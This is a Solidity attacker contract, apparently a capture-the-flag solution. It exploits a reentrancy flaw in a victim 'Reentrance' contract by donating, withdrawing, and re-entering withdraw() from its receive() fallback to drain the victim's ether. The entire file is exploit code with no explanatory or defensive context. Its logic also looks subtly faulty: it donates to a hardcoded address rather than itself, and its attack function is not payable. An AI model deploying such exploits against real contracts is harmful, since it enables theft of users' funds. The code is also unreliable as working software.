pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentrancyExploitCorrected {
    IReentrance public instance;

    constructor(address payable _instance) public {
        instance = IReentrance(_instance);
    }

    // Attack entry point
    function attack() public {
        instance.donate{value: 1000000000000000}(0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0);
        instance.withdraw(1000000000000000);
    }

    // Fallback function called when victim contract sends ETH
    receive() external payable {
        if (address(instance).balance >= 1) {
            instance.withdraw(1);
        }
    }
}
